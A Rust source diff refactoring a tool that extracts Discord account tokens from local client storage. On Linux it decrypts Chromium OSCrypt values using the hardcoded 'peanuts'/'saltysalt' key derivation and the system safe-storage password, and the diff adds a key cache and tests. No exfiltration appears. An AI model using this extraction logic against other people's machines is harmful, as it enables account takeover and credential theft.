@@ -1,10 +1,13 @@
 use anyhow::{Context, Result};
 use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
 use regex::Regex;
+use std::collections::HashSet;
 #[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
 use std::fs;
+#[cfg(target_os = "linux")]
+use std::path::Path;
 #[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
-use std::path::{Path, PathBuf};
+use std::path::PathBuf;
 
 // Windows-specific imports
 #[cfg(target_os = "windows")]
@@ -88,7 +91,7 @@ pub fn extract_tokens() -> Result<Vec<String>> {
         "Starting token extraction",
         None,
     );
-    let mut tokens = std::collections::HashSet::new();
+    let mut tokens = HashSet::new();
     let clients = vec![
         DiscordClient::Stable,
         DiscordClient::Canary,
@@ -144,9 +147,13 @@ pub fn extract_tokens() -> Result<Vec<String>> {
         anyhow::bail!("Could not find tokens in any Discord client")
     }
 
+    Ok(sorted_tokens(tokens))
+}
+
+fn sorted_tokens(tokens: HashSet<String>) -> Vec<String> {
     let mut tokens: Vec<String> = tokens.into_iter().collect();
     tokens.sort();
-    Ok(tokens)
+    tokens
 }
 
 #[cfg(target_os = "windows")]
@@ -416,10 +423,10 @@ fn get_master_key_from_keychain(client: &DiscordClient) -> Result<Vec<u8>> {
 #[cfg(target_os = "linux")]
 fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
     use crate::logger::{log, sanitize_path, LogCategory, LogLevel};
-    use std::collections::HashSet;
 
     let profile_dirs = linux_profile_dirs(client)?;
     let mut tokens = HashSet::new();
+    let mut oscrypt_keys = LinuxOscryptKeyCache::default();
     let mut checked_any_profile = false;
     let mut last_error = None;
 
@@ -439,7 +446,7 @@ fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
             None,
         );
 
-        match extract_from_linux_profile(client, &discord_path) {
+        match extract_from_linux_profile(client, &discord_path, &mut oscrypt_keys) {
             Ok(profile_tokens) => {
                 for token in profile_tokens {
                     tokens.insert(token);
@@ -468,17 +475,19 @@ fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
         anyhow::bail!("No tokens found in Linux Discord profile");
     }
 
-    let mut tokens: Vec<String> = tokens.into_iter().collect();
-    tokens.sort();
-    Ok(tokens)
+    Ok(sorted_tokens(tokens))
 }
 
 #[cfg(target_os = "linux")]
 fn linux_profile_dirs(client: &DiscordClient) -> Result<Vec<PathBuf>> {
-    let home = std::env::var("HOME").context("Could not get HOME environment variable")?;
-    let home = PathBuf::from(home);
+    let home = std::env::var_os("HOME")
+        .filter(|value| !value.is_empty())
+        .map(PathBuf::from)
+        .context("Could not get HOME environment variable")?;
+    let xdg_config_home = std::env::var_os("XDG_CONFIG_HOME").map(PathBuf::from);
+    let config_root = linux_config_root(&home, xdg_config_home.as_deref());
     let profile_name = client.path();
-    let mut paths = vec![home.join(".config").join(profile_name)];
+    let mut paths = vec![config_root.join(profile_name)];
 
     if matches!(client, DiscordClient::Stable) {
         paths.push(
@@ -501,9 +510,20 @@ fn linux_profile_dirs(client: &DiscordClient) -> Result<Vec<PathBuf>> {
 }
 
 #[cfg(target_os = "linux")]
-fn extract_from_linux_profile(client: &DiscordClient, discord_path: &Path) -> Result<Vec<String>> {
+fn linux_config_root(home: &Path, xdg_config_home: Option<&Path>) -> PathBuf {
+    xdg_config_home
+        .filter(|path| path.is_absolute())
+        .map(Path::to_path_buf)
+        .unwrap_or_else(|| home.join(".config"))
+}
+
+#[cfg(target_os = "linux")]
+fn extract_from_linux_profile(
+    client: &DiscordClient,
+    discord_path: &Path,
+    oscrypt_keys: &mut LinuxOscryptKeyCache,
+) -> Result<Vec<String>> {
     use crate::logger::{log, LogCategory, LogLevel};
-    use std::collections::HashSet;
 
     let leveldb_path = discord_path.join("Local Storage").join("leveldb");
 
@@ -542,7 +562,7 @@ fn extract_from_linux_profile(client: &DiscordClient, discord_path: &Path) -> Re
         );
 
         for payload in encrypted_payloads {
-            if let Ok(token) = decrypt_linux_oscrypt_value(&payload, client) {
+            if let Ok(token) = decrypt_linux_oscrypt_value(&payload, client, oscrypt_keys) {
                 tokens.insert(token);
             }
         }
@@ -559,9 +579,7 @@ fn extract_from_linux_profile(client: &DiscordClient, discord_path: &Path) -> Re
         None,
     );
 
-    let mut tokens: Vec<String> = tokens.into_iter().collect();
-    tokens.sort();
-    Ok(tokens)
+    Ok(sorted_tokens(tokens))
 }
 
 #[cfg(not(any(target_os = "windows", target_os = "macos", target_os = "linux")))]
@@ -570,12 +588,60 @@ fn try_extract_from_client(_client: &DiscordClient) -> Result<Vec<String>> {
 }
 
 #[cfg(target_os = "linux")]
-fn decrypt_linux_oscrypt_value(encrypted_data: &[u8], client: &DiscordClient) -> Result<String> {
-    use aes::cipher::{BlockDecryptMut, KeyIvInit};
-    use cbc::Decryptor;
+#[derive(Default)]
+struct LinuxOscryptKeyCache {
+    v10: Option<zeroize::Zeroizing<[u8; 16]>>,
+    v11: Option<zeroize::Zeroizing<[u8; 16]>>,
+}
+
+#[cfg(target_os = "linux")]
+impl LinuxOscryptKeyCache {
+    fn key_for(&mut self, version: &[u8], client: &DiscordClient) -> Result<&[u8]> {
+        match version {
+            b"v10" => {
+                let key = self
+                    .v10
+                    .get_or_insert_with(|| derive_linux_oscrypt_key(b"peanuts"));
+                Ok(&key[..])
+            }
+            b"v11" => {
+                if self.v11.is_none() {
+                    let password = zeroize::Zeroizing::new(
+                        get_linux_safe_storage_password(client)
+                            .context("Could not get Linux safe storage key")?,
+                    );
+                    self.v11 = Some(derive_linux_oscrypt_key(&password));
+                }
+
+                self.v11
+                    .as_deref()
+                    .map(|key| &key[..])
+                    .context("Linux safe storage key cache was not initialized")
+            }
+            version => anyhow::bail!("Unknown Linux OSCrypt version: {:?}", version),
+        }
+    }
+}
+
+#[cfg(target_os = "linux")]
+fn derive_linux_oscrypt_key(password: &[u8]) -> zeroize::Zeroizing<[u8; 16]> {
     use pbkdf2::pbkdf2_hmac;
     use sha1::Sha1;
-    use zeroize::Zeroize;
+
+    let mut key = zeroize::Zeroizing::new([0u8; 16]);
+    pbkdf2_hmac::<Sha1>(password, b"saltysalt", 1, &mut *key);
+    key
+}
+
+#[cfg(target_os = "linux")]
+fn decrypt_linux_oscrypt_value(
+    encrypted_data: &[u8],
+    client: &DiscordClient,
+    oscrypt_keys: &mut LinuxOscryptKeyCache,
+) -> Result<String> {
+    use aes::cipher::{BlockDecryptMut, KeyIvInit};
+    use cbc::Decryptor;
+    use zeroize::Zeroizing;
 
     type Aes128CbcDec = Decryptor<aes::Aes128>;
 
@@ -583,36 +649,17 @@ fn decrypt_linux_oscrypt_value(encrypted_data: &[u8], client: &DiscordClient) ->
         anyhow::bail!("Encrypted data is too short");
     }
 
-    let mut key = [0u8; 16];
-    match &encrypted_data[..3] {
-        b"v10" => {
-            pbkdf2_hmac::<Sha1>(b"peanuts", b"saltysalt", 1, &mut key);
-        }
-        b"v11" => {
-            let mut password = get_linux_safe_storage_password(client)
-                .context("Could not get Linux safe storage key")?;
-            pbkdf2_hmac::<Sha1>(&password, b"saltysalt", 1, &mut key);
-            password.zeroize();
-        }
-        version => {
-            anyhow::bail!("Unknown Linux OSCrypt version: {:?}", version);
-        }
-    }
+    let key = oscrypt_keys.key_for(&encrypted_data[..3], client)?;
 
-    let mut buf = encrypted_data[3..].to_vec();
+    let mut buf = Zeroizing::new(encrypted_data[3..].to_vec());
     let iv = b"                ";
-    let cipher = Aes128CbcDec::new_from_slices(&key, iv)
+    let cipher = Aes128CbcDec::new_from_slices(key, iv)
         .map_err(|e| anyhow::anyhow!("Failed to create Linux OSCrypt cipher: {:?}", e))?;
     let decrypted = cipher
         .decrypt_padded_mut::<aes::cipher::block_padding::Pkcs7>(&mut buf)
         .map_err(|e| anyhow::anyhow!("Linux OSCrypt decryption failed: {:?}", e))?;
 
-    let result =
-        String::from_utf8(decrypted.to_vec()).context("Decrypted data is not valid UTF-8")?;
-    buf.zeroize();
-    key.zeroize();
-
-    Ok(result)
+    String::from_utf8(decrypted.to_vec()).context("Decrypted data is not valid UTF-8")
 }
 
 #[cfg(target_os = "linux")]
@@ -711,7 +758,7 @@ fn find_plaintext_tokens(data: &[u8]) -> Vec<String> {
         .collect()
 }
 
-#[cfg(any(target_os = "windows", target_os = "macos", target_os = "linux"))]
+#[cfg(target_os = "linux")]
 fn is_leveldb_log_or_table(path: &Path) -> bool {
     matches!(
         path.extension().and_then(|ext| ext.to_str()),
@@ -1067,6 +1114,25 @@ mod tests {
 
     #[cfg(target_os = "linux")]
     #[test]
+    fn test_linux_config_root_respects_absolute_xdg_path() {
+        let home = Path::new("/home/tester");
+
+        assert_eq!(
+            linux_config_root(home, Some(Path::new("/custom/config"))),
+            PathBuf::from("/custom/config")
+        );
+        assert_eq!(
+            linux_config_root(home, Some(Path::new("relative/config"))),
+            PathBuf::from("/home/tester/.config")
+        );
+        assert_eq!(
+            linux_config_root(home, None),
+            PathBuf::from("/home/tester/.config")
+        );
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
     fn test_decrypt_linux_v10_basic_text_value() {
         use aes::cipher::{BlockEncryptMut, KeyIvInit};
         use cbc::Encryptor;
@@ -1085,7 +1151,12 @@ mod tests {
         let mut encrypted = b"v10".to_vec();
         encrypted.extend(ciphertext);
 
-        let decrypted = decrypt_linux_oscrypt_value(&encrypted, &DiscordClient::Stable).unwrap();
+        let decrypted = decrypt_linux_oscrypt_value(
+            &encrypted,
+            &DiscordClient::Stable,
+            &mut LinuxOscryptKeyCache::default(),
+        )
+        .unwrap();
 
         assert_eq!(decrypted.as_bytes(), plaintext);
     }
